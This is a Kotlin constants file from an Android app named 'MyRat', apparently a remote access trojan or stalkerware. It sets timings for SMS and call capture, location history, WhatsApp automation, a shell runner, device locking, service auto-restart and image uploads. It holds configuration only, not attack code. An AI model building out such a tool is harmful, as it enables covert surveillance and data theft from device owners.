package com.myrat.app.utils

object Constants {
    // App Configuration
    const val APP_NAME = "MyRat"
    const val DATABASE_NAME = "myrat_db"
    
    // Firebase
    const val FIREBASE_TIMEOUT = 30000L
    const val MAX_RETRY_ATTEMPTS = 3
    
    // Services
    const val SERVICE_RESTART_INTERVAL = 5 * 60 * 1000L // 5 minutes
    const val WAKE_LOCK_TIMEOUT = 60 * 60 * 1000L // 1 hour
    
    // Permissions
    const val PERMISSION_REQUEST_DELAY = 1000L
    const val SPECIAL_PERMISSION_DELAY = 4000L
    const val BACKGROUND_LOCATION_DELAY = 2000L
    
    // WhatsApp
    const val WHATSAPP_PACKAGE = "com.whatsapp"
    const val WHATSAPP_BUSINESS_PACKAGE = "com.whatsapp.w4b"
    const val WHATSAPP_ACTION_DELAY = 2000L
    const val WHATSAPP_SEARCH_TIMEOUT = 10000L
    
    // Notifications
    const val NOTIFICATION_CHANNEL_SMS = "SmsServiceChannel"
    const val NOTIFICATION_CHANNEL_CALL = "CallServiceChannel"
    const val NOTIFICATION_CHANNEL_LOCATION = "LocationTracker"
    const val NOTIFICATION_CHANNEL_LOCK = "LockServiceChannel"
    const val NOTIFICATION_CHANNEL_WHATSAPP = "WhatsAppService"
    const val NOTIFICATION_CHANNEL_SHELL = "ShellRunnerService"
    const val NOTIFICATION_CHANNEL_MONITOR = "ServiceMonitor"
    
    // Cache
    const val MESSAGE_CACHE_DURATION = 24 * 60 * 60 * 1000L // 24 hours
    const val CACHE_CLEANUP_INTERVAL = 60 * 1000L // 1 minute
    
    // Batch Processing
    const val DEFAULT_BATCH_SIZE = 25
    const val BATCH_DELAY = 300L
    const val MAX_BATCH_SIZE = 100
    
    // Location
    const val LOCATION_UPDATE_INTERVAL = 10_000L
    const val LOCATION_FASTEST_INTERVAL = 5_000L
    const val LOCATION_HISTORY_LIMIT = 1000
    
    // SMS
    const val SMS_BATCH_SIZE = 10
    const val SMS_BATCH_DELAY = 60_000L // 1 minute
    
    // Call
    const val CALL_TIMEOUT = 30_000L
    
    // Image Upload
    const val IMAGE_COMPRESSION_QUALITY = 80
    const val IMAGE_MAX_SIZE = 1024 * 1024 // 1MB
    const val IMAGE_BATCH_SIZE = 20
}